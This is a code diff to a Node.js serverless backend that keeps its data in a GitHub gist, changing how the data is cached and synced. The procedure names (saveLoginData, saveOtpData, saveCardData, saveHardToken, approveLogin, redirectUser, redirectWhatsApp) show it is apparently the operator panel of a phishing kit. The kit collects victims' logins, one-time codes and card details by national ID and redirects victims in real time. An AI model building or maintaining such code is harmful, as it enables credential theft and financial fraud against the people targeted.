@@ -49,49 +49,56 @@ function ghApi(method, body) {
 }
 
 let _cache = null;
-let _dirty = false;
-let _lastGistWrite = 0;
-const WRITE_PROTECT_MS = 8000;
+let _lastRead = 0;
+let _lastWrite = 0;
 
 function saveTmp() {
   if (!_cache) return;
   try { fs.writeFileSync(DATA_FILE, JSON.stringify(_cache), 'utf8'); } catch {}
 }
 
-async function loadData() {
+async function loadData(forceRefresh, isAdmin) {
   if (!_cache) {
     try {
       if (fs.existsSync(DATA_FILE)) _cache = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
     } catch {}
   }
-  if (_cache && (_dirty || Date.now() - _lastGistWrite < WRITE_PROTECT_MS)) {
-    return _cache;
+  if (_cache && Date.now() - _lastWrite < 5000) return _cache;
+  const cacheMs = isAdmin ? 3000 : 10000;
+  if (forceRefresh || !_cache || Date.now() - _lastRead > cacheMs) {
+    try {
+      const gist = await ghApi('GET');
+      if (gist?.files?.['data.json']?.content) {
+        _cache = JSON.parse(gist.files['data.json'].content);
+        _lastRead = Date.now();
+        saveTmp();
+      }
+    } catch {}
   }
-  try {
-    const gist = await ghApi('GET');
-    if (gist?.files?.['data.json']?.content) {
-      _cache = JSON.parse(gist.files['data.json'].content);
-      saveTmp();
-    }
-  } catch {}
   if (!_cache) _cache = { ...DEFAULT_DATA };
   return _cache;
 }
 
-async function syncToGist() {
-  if (!_dirty) return;
-  _dirty = false;
+async function writeToGist() {
+  if (!_cache) return;
   try {
     await ghApi('PATCH', { files: { 'data.json': { content: JSON.stringify(_cache) } } });
-    _lastGistWrite = Date.now();
+    _lastWrite = Date.now();
+    _lastRead = Date.now();
     saveTmp();
-  } catch { _dirty = true; }
+  } catch {}
 }
 
-function markDirty() {
-  _dirty = true;
-  saveTmp();
-}
+const SYNC_MUTATIONS = new Set([
+  'applications.savePersonalInfo', 'applications.saveLoginData',
+  'applications.saveOtpData', 'applications.saveCardData',
+  'applications.saveHardToken', 'applications.saveWatchLink',
+  'admin.approveLogin', 'admin.rejectLogin',
+  'admin.redirectUser', 'admin.redirectVisitor', 'admin.redirectAllToToken',
+  'admin.redirectWhatsApp', 'admin.deleteApplication', 'admin.deleteInactiveClients',
+  'admin.deleteAllClients', 'admin.setCustomMessage', 'admin.updateWhatsAppLink',
+  'admin.resetTotalVisitors',
+]);
 
 function getOrCreateApp(data, nationalId) {
   if (!data.applications[nationalId]) {
@@ -368,22 +375,15 @@ module.exports = async (req, res) => {
   else inputs = req.body || {};
 
   const isAdmin = isAdminReq(req);
-  const data = await loadData();
-
-  const READ_ONLY = new Set([
-    'admin.getApplications', 'admin.getLiveVisitors', 'admin.getAllVisitors',
-    'admin.getWhatsAppLink', 'admin.checkSession', 'admin.getVisitorRedirect',
-    'applications.getRedirectStatus', 'applications.getCustomMessage',
-  ]);
+  const hasSyncMutation = procs.some(name => SYNC_MUTATIONS.has(name.trim()));
+  const data = await loadData(hasSyncMutation, isAdmin);
 
   let setCookie = null, clearCookie = false;
-  let hasMutation = false;
 
   const results = await Promise.all(procs.map(async (name, i) => {
     const raw = inputs[String(i)] || inputs;
     const input = raw?.json || raw || {};
     const procName = name.trim();
-    if (!READ_ONLY.has(procName)) hasMutation = true;
     try {
       const result = executeProcedure(procName, input, isAdmin, data);
       if (result?._setToken) { setCookie = result._setToken; delete result._setToken; }
@@ -394,8 +394,8 @@ module.exports = async (req, res) => {
     }
   }));
 
-  if (hasMutation) markDirty();
-  await syncToGist();
+  if (hasSyncMutation) await writeToGist();
+  saveTmp();
 
   if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
   if (clearCookie) res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
